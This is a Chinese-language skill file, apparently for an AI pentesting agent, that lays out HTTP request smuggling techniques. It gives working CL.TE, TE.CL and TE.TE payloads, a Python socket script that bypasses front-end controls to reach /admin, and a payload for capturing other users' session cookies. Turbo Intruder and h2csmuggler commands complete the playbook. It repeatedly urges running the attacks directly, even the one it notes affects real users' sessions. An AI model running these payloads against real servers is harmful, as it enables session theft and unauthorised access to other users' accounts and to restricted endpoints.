---
name: 盗天·夹带
description: >-
 HTTP 请求走私（Request Smuggling）完整手法：CL.TE / TE.CL / TE.TE 变体识别、
 走私绕过前端访问控制、会话捕获、反射 XSS 转存储、
 内部请求伪造（SSRF-via-smuggling）。
 
 纯 CDN 指纹识别走 cdn-origin-bypass；WAF 绕过走 evasion。
version: 1.0.0
---

> **盗天**
> 自身本是轮回客，踏遍万里寻归途！
> 盗亦有道留一线，手到偷来不问途。

# HTTP 请求走私完整手法

**前提**：目标在 `授权范围`。smuggling 影响所有共享该连接的用户，授权内直接做。

---

## 快速识别（先自动后手工）

```bash
# smuggler.py 自动探测（最快）
pip install requests
python3 -c "
import subprocess, sys
subprocess.run(['pip','install','requests','h2'],capture_output=True)
" 2>/dev/null

# 克隆后运行
git clone https://github.com/defparam/smuggler
cd smuggler
python3 smuggler.py -u https://授权站/ -l 5

# PortSwigger HTTP Request Smuggler (Burp 插件)
# Extensions → BApp Store → HTTP Request Smuggler → Audit
```

---

## §1 原理与分类

```
前端(代理/CDN) <─────────────> 后端服务器
 │ 同一 TCP 连接复用
 │
CL.TE: 前端用 Content-Length, 后端用 Transfer-Encoding
TE.CL: 前端用 Transfer-Encoding, 后端用 Content-Length
TE.TE: 两端都用 TE, 但对 obfuscated 头理解不一致
```

---

## §2 CL.TE 走私

```
前端用 Content-Length，后端用 Transfer-Encoding
→ 走私请求附着到下一个合法请求的头部
```

```http
POST / HTTP/1.1
Host: 授权站
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**验证方法**（timing + diff）：

```bash
# 发两次；第二次响应异常（400/慢响应）= 走私成立
curl -s -o /dev/null -w "%{http_code} %{time_total}" \
 --http1.1 \
 -H "Content-Length: 6" \
 -H "Transfer-Encoding: chunked" \
 -d $'0\r\n\r\nG' \
 https://授权站/

# 正确工具：使用 turbo-intruder 或 Python socket 精确控制字节
```

---

## §3 TE.CL 走私

```
前端用 Transfer-Encoding，后端用 Content-Length
→ 尾部数据毒化下一请求
```

```http
POST / HTTP/1.1
Host: 授权站
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

---

## §4 TE.TE 混淆（Obfuscation）

```http
# 混淆让其中一个不识别 TE 头，退回 CL
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:
 chunked

X: X[\n]Transfer-Encoding: chunked

GET / HTTP/1.1
Transfer-Encoding: chunked
```

---

## §5 利用：绕过前端访问控制

```python
# 场景：/admin 被前端代理 403，但后端不检查
# 走私一个 "来自内部" 的 admin 请求

import socket, ssl

req = (
 b"POST / HTTP/1.1\r\n"
 b"Host: 授权站\r\n"
 b"Content-Type: application/x-www-form-urlencoded\r\n"
 b"Content-Length: 116\r\n"
 b"Transfer-Encoding: chunked\r\n"
 b"\r\n"
 b"5e\r\n"
 b"GET /admin HTTP/1.1\r\n"
 b"Host: localhost\r\n"
 b"Content-Type: application/x-www-form-urlencoded\r\n"
 b"Content-Length: 10\r\n"
 b"\r\n"
 b"x=\r\n"
 b"0\r\n"
 b"\r\n"
)

ctx = ssl.create_default_context()
with socket.create_connection(('授权站', 443)) as sock:
 with ctx.wrap_socket(sock, server_hostname='授权站') as ssock:
 ssock.sendall(req)
 # 等待并拼接响应
 data = b""
 while True:
 chunk = ssock.recv(4096)
 if not chunk: break
 data += chunk
 print(data.decode(errors='replace'))
```

---

## §6 利用：捕获其他用户请求（L3，授权内直接做）

```
走私半个请求头，让下一个合法用户的请求被附加到此：
POST → 走私前缀 → 下一用户的 Cookie/Token 出现在 POST body 里
→ 通过错误响应或存储反射读出
```

```http
POST / HTTP/1.1
Host: 授权站
Content-Length: 198
Transfer-Encoding: chunked

c7
POST /post/comment HTTP/1.1
Host: 授权站
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=YOUR_SESSION

csrf=TOKEN&postId=1&comment=

0

```

**⚠️ 此技术影响真实用户会话，授权内直接做**

---

## §7 Turbo Intruder 精准走私

```python
# Burp Turbo Intruder 脚本（发包精准）
def queueRequests(target, wordlists):
 engine = RequestEngine(endpoint=target.endpoint,
 concurrentConnections=5,
 requestsPerConnection=1,
 pipeline=False)
 
 # 走私请求
 smuggle = '''POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG'''
 
 for i in range(5):
 engine.queue(smuggle)

def handleResponse(req, interesting):
 if '400' in req.response or req.response.startswith('G'):
 table.add(req)
```

---

## §8 H2.CL / H2.TE（HTTP/2 降级走私）

```bash
# HTTP/2 → HTTP/1.1 降级时走私
# 在 h2 请求中注入 \r\n 到头部值

# 使用 h2csmuggler
pip install h2csmuggler
h2csmuggler -x https://授权站 http://localhost/admin

# 或 Burp HTTP/2 Tab → 手动注入 header 换行
# Header name: foo\r\nTransfer-Encoding: chunked
```

---

## 成功口径

| 档 | 条件 |
|----|------|
| L1 | timing 或 diff 确认走私存在 |
| L2 | 绕过前端访问控制（/admin 200） |
| L3 | 捕获会话/SSRF（授权内直接做） |

---

## 真源

- 手法：`传承/薄青·岁岁索命.md`
- 工具：`python3 炼蛊房/core_web_surface_probe.py --help`
